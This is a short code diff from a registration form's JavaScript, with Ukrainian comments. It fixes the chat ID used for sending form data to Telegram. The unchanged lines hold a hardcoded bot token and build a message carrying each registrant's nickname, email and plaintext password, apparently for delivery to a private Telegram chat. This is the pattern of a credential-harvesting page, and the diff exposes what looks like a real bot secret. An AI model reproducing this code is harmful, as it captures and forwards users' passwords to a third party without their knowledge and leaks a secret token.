@@ -43,7 +43,7 @@ document.getElementById('registration-form').addEventListener('submit', function
     // === ВІДПРАВКА В TELEGRAM ===
     // Встав сюди свій токен від BotFather та Chat ID від Getmyid_bot
     const botToken = '8460092788:AAHPbETm_DIczqYL7vA4XCbnWioiVBZYHwg'; 
-    const chatId = ' 8399462172';             
+    const chatId = '8399462172';             
     
     // Формуємо текст повідомлення
     const messageText = `🔥 Нова реєстрація!\n👤 Нікнейм: ${nickname}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
